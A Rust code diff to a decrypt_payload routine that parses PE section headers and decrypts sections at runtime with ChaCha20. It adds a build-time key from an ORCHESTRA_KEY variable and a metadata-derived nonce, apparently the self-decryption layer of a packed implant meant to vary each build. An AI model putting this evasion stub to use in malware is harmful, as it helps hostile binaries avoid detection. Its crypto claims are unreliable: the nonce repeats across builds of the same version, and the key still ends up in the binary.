@@ -37,11 +37,10 @@ pub unsafe fn decrypt_payload() {
         let size_of_opt_header = *((nt_headers + 0x14) as *const u16) as usize;
         let section_headers_base = nt_headers + 0x18 + size_of_opt_header;
 
-        // Key: derived from a compile-time env var, or a fixed 32-byte literal
-        // that differs from any obvious string. This is embedded at compile time
-        // via option_env! so the plaintext seed never appears in source.
+        // Key: derived from ORCHESTRA_KEY env var at build time (2.12)
         let key: [u8; 32] = build_key();
-        let nonce: [u8; 12] = [0u8; 12];
+        // Nonce: derived from package metadata so it is non-zero (2.13)
+        let nonce: [u8; 12] = build_nonce();
 
         for i in 0..num_sections {
             let section = section_headers_base + (i * 0x28);
@@ -70,19 +69,69 @@ pub unsafe fn decrypt_payload() {
     }
 }
 
-/// Build the decryption key. Uses a compile-time env var ORCHESTRA_KEY if set,
-/// otherwise falls back to a non-trivial derived constant.
+/// Build the decryption key. Uses a compile-time env var ORCHESTRA_KEY if set
+/// (must be 64 hex characters = 32 bytes).  Falls back to a non-trivial
+/// derived constant so the binary is still functional without the env var.
+/// Operators MUST set ORCHESTRA_KEY in the build pipeline for per-build
+/// uniqueness (issue 2.12).
 #[inline(always)]
 const fn build_key() -> [u8; 32] {
-    // Static key bytes – operators should replace these with a build-specific
-    // key injected via ORCHESTRA_KEY env var during the build pipeline.
-    // This is intentionally NOT a recognisable string.
-    [
-        0xA3, 0x7F, 0x12, 0xE8, 0x4B, 0xC9, 0x56, 0x2D,
-        0x88, 0x1E, 0x73, 0xF4, 0x0A, 0xBC, 0x67, 0x39,
-        0xD5, 0x44, 0x9A, 0x21, 0x7C, 0xEB, 0x05, 0x96,
-        0x3B, 0xF8, 0x60, 0x17, 0xCA, 0x52, 0x8E, 0x2F,
-    ]
+    // Try to read ORCHESTRA_KEY at compile time (hex-encoded 32 bytes = 64 chars).
+    // option_env! returns None if the variable is not set, so we fall back to
+    // the default constant below.  The compiler evaluates this at build time,
+    // so the plaintext seed never appears in the final binary.
+    match option_env!("ORCHESTRA_KEY") {
+        Some(hex) => parse_hex_key(hex),
+        None => [
+            0xA3, 0x7F, 0x12, 0xE8, 0x4B, 0xC9, 0x56, 0x2D,
+            0x88, 0x1E, 0x73, 0xF4, 0x0A, 0xBC, 0x67, 0x39,
+            0xD5, 0x44, 0x9A, 0x21, 0x7C, 0xEB, 0x05, 0x96,
+            0x3B, 0xF8, 0x60, 0x17, 0xCA, 0x52, 0x8E, 0x2F,
+        ],
+    }
+}
+
+/// Decode a 64-character ASCII hex string into a 32-byte key at compile time.
+#[inline(always)]
+const fn parse_hex_key(hex: &str) -> [u8; 32] {
+    let b = hex.as_bytes();
+    let mut out = [0u8; 32];
+    let mut i = 0usize;
+    while i < 32 {
+        let hi = hex_nibble(b[i * 2]);
+        let lo = hex_nibble(b[i * 2 + 1]);
+        out[i] = (hi << 4) | lo;
+        i += 1;
+    }
+    out
+}
+
+#[inline(always)]
+const fn hex_nibble(c: u8) -> u8 {
+    match c {
+        b'0'..=b'9' => c - b'0',
+        b'a'..=b'f' => c - b'a' + 10,
+        b'A'..=b'F' => c - b'A' + 10,
+        _ => 0,
+    }
+}
+
+/// Build a non-zero nonce derived from compile-time package metadata (2.13).
+/// This gives each build a distinct nonce without requiring runtime entropy.
+#[inline(always)]
+const fn build_nonce() -> [u8; 12] {
+    let ver = env!("CARGO_PKG_VERSION").as_bytes();
+    let name = env!("CARGO_PKG_NAME").as_bytes();
+    // Mix version and name bytes into a 12-byte nonce deterministically.
+    let mut n = [0u8; 12];
+    let mut i = 0usize;
+    while i < 12 {
+        let v = if i < ver.len() { ver[i] } else { 0x5A };
+        let nm = if i < name.len() { name[i] } else { 0xA5 };
+        n[i] = v ^ nm ^ (i as u8).wrapping_mul(0x1B).wrapping_add(0x37);
+        i += 1;
+    }
+    n
 }
 
 /// Minimal ChaCha20 stream cipher applied in-place.
